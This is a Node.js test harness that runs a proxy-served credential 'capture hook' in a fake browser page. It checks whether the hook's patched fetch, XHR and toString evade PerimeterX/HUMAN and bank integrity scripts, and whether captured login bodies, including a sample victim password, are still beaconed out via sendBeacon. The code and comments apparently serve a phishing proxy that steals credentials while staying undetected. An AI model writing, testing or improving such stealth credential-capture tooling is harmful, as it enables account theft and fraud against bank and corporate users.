/* Run the REAL capture hook in a fake page and report what a page's own script
 * could observe. This is how the stealth layer is proven: the same artifact the
 * proxy serves is executed here, and the properties PerimeterX/HUMAN and bank
 * integrity scripts actually read are printed as JSON for the Python test.
 *
 *   node tests/hook_harness.js <hook.js> [--no-beacon-block]
 *
 * Anything the hook needs (window, document, location, navigator, Blob, fetch, XHR)
 * is stubbed with a NATIVE-SHAPED surface, so "is this a wrapped builtin" has a real
 * answer here rather than a trivially-detected one.
 */
const fs = require("fs");
const vm = require("vm");

const src = fs.readFileSync(process.argv[2], "utf8");
const nativeCalls = [];
const beacons = [];

function makeNativeFn(name, arity, impl) {
  const fn = impl || function () {};
  Object.defineProperty(fn, "name", { value: name, configurable: true });
  Object.defineProperty(fn, "length", { value: arity, configurable: true });
  return fn;
}

function makeSandbox() {
  const sandbox = {};
  sandbox.window = sandbox;
  sandbox.self = sandbox;
  sandbox.globalThis = sandbox;

  const realFetch = makeNativeFn("fetch", 1, function (input, init) {
    nativeCalls.push({ url: String(input), body: init && init.body });
    return Promise.resolve({
      ok: true, status: 200,
      text: () => Promise.resolve(""), json: () => Promise.resolve({}),
    });
  });
  // exactly how a browser exposes it: an own, enumerable, writable, configurable prop
  Object.defineProperty(sandbox, "fetch", {
    value: realFetch, writable: true, enumerable: true, configurable: true,
  });

  const XHR = function () {};
  const open = makeNativeFn("open", 5);
  const send = makeNativeFn("send", 1);
  // DOM prototype methods are NON-enumerable, while a window global like fetch is
  // enumerable: the patch has to copy whichever it found, or the difference is a tell
  Object.defineProperty(XHR.prototype, "open", {
    value: open, writable: true, enumerable: false, configurable: true,
  });
  Object.defineProperty(XHR.prototype, "send", {
    value: send, writable: true, enumerable: false, configurable: true,
  });
  sandbox.XMLHttpRequest = XHR;

  sandbox.location = {
    href: "https://target.example/login", pathname: "/login",
    host: "target.example", hostname: "target.example", search: "",
    protocol: "https:", origin: "https://target.example",
  };
  sandbox.navigator = {
    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
    sendBeacon: function (url) { beacons.push(String(url)); return true; },
    clipboard: { writeText: function () { return Promise.resolve(); } },
    languages: ["en-US"], platform: "Win32", hardwareConcurrency: 8,
  };
  const node = function (tag) {
    return {
      tagName: tag, type: "", name: "", value: "", id: "", className: "",
      style: { cssText: "" }, dataset: {}, children: [],
      setAttribute: function () {}, getAttribute: function () { return null; },
      appendChild: function (c) { return c; }, removeChild: function (c) { return c; },
      addEventListener: function () {}, removeEventListener: function () {},
      querySelectorAll: function () { return []; }, querySelector: function () { return null; },
      submit: function () {}, focus: function () {}, click: function () {},
      getBoundingClientRect: function () {
        return { top: 0, left: 0, width: 10, height: 10, bottom: 10, right: 10 };
      },
    };
  };
  sandbox.document = {
    addEventListener: function () {}, removeEventListener: function () {},
    querySelectorAll: function () { return []; }, querySelector: function () { return null; },
    createElement: node, createTextNode: function () { return node("span"); },
    getElementById: function () { return null; },
    body: node("body"), documentElement: node("html"), head: node("head"),
    cookie: "", title: "Login", readyState: "complete", referrer: "",
    forms: [], images: [], scripts: [],
  };
  // the hook exfiltrates through sendBeacon(new Blob([...])): without Blob the call
  // throws inside its try/catch and the capture is silently lost (this harness has to
  // provide what a browser has, or it tests nothing)
  sandbox.Blob = function (parts, opts) {
    this.parts = parts || [];
    this.type = (opts && opts.type) || "";
    this.size = String(this.parts.join("")).length;
    this.__text = this.parts.join("");
  };
  sandbox.FormData = function () { this.append = function () {}; };
  sandbox.URL = { createObjectURL: function () { return "blob:x"; } };
  sandbox.performance = { now: () => Date.now(), timeOrigin: Date.now() };
  sandbox.screen = { width: 1920, height: 1080, colorDepth: 24, availWidth: 1920 };
  sandbox.localStorage = { getItem: () => null, setItem: () => {}, removeItem: () => {} };
  sandbox.sessionStorage = sandbox.localStorage;
  sandbox.addEventListener = function () {};
  sandbox.setTimeout = setTimeout;
  sandbox.setInterval = setInterval;
  sandbox.clearTimeout = clearTimeout;
  sandbox.clearInterval = clearInterval;
  sandbox.Date = Date;
  sandbox.Math = Math;
  sandbox.JSON = JSON;
  sandbox.console = { log: function () {}, warn: function () {}, error: function () {} };
  return sandbox;
}

const sandbox = makeSandbox();
vm.createContext(sandbox);
// the pristine toString, captured before the hook runs: comparing identity afterwards
// is the truthful "did it install a shim" signal (a native toString is naturally
// native-looking, so asking toString about itself says nothing)
const pristineToString = vm.runInContext("Function.prototype.toString", sandbox);
try {
  vm.runInContext(src, sandbox);
} catch (e) {
  console.log(JSON.stringify({ ok: false, error: String(e && e.message || e) }));
  process.exit(0);
}

const fetchFn = sandbox.fetch;
const XHR = sandbox.XMLHttpRequest;
// the context has its own intrinsics: reading `sandbox.Function` from OUTSIDE the vm
// gives undefined, so ask the context itself (and ask it for the real toString, which
// is what a page's integrity script would use)
const ctxFunction = vm.runInContext("Function", sandbox);
const nativeToString = ctxFunction.prototype.toString;
function toStringOf(fn) {
  return vm.runInContext("(function (f) { return Function.prototype.toString.call(f); })", sandbox)(fn);
}

function desc(obj, name) {
  const d = Object.getOwnPropertyDescriptor(obj, name) || {};
  return { enumerable: !!d.enumerable, writable: !!d.writable, configurable: !!d.configurable };
}

const report = {
  ok: true,
  fetch_to_string: nativeToString.call(fetchFn),
  proto_to_string_call: toStringOf(fetchFn),
  string_coercion: String(fetchFn),
  shim_is_native: vm.runInContext(
    "/\\[native code\\]/.test(Function.prototype.toString.toString())", sandbox),
  fetch_name: fetchFn.name,
  fetch_length: fetchFn.length,
  fetch_desc: desc(sandbox, "fetch"),
  xhr_send_to_string: toStringOf(XHR.prototype.send),
  xhr_open_to_string: toStringOf(XHR.prototype.open),
  toString_replaced:
    vm.runInContext("Function.prototype.toString", sandbox) !== pristineToString,
  xhr_send_name: XHR.prototype.send.name,
  xhr_send_desc: desc(XHR.prototype, "send"),
  xhr_open_desc: desc(XHR.prototype, "open"),
  native_still_reachable: null,
  beacon_on_login_body: null,
  beacon_on_form_submit: null,
};

// 1) the wrapper must still do its job AND still call the real one
fetchFn("https://target.example/api/auth/login", {
  method: "POST", headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username: "victim@corp.test", password: "S3cret!x" }),
});
setTimeout(function () {
  report.native_still_reachable = nativeCalls.length > 0;
  report.beacon_on_login_body = beacons.length > 0;
  // 2) an XHR body must still be captured
  try {
    const x = new XHR();
    x.open("POST", "https://target.example/api/login");
    x.send("username=u&password=p");
  } catch (e) {}
  setTimeout(function () {
    report.beacon_on_form_submit = beacons.length > 1;
    report.beacon_urls = beacons.slice(0, 4);
    console.log(JSON.stringify(report));
    process.exit(0);
  }, 50);
}, 50);
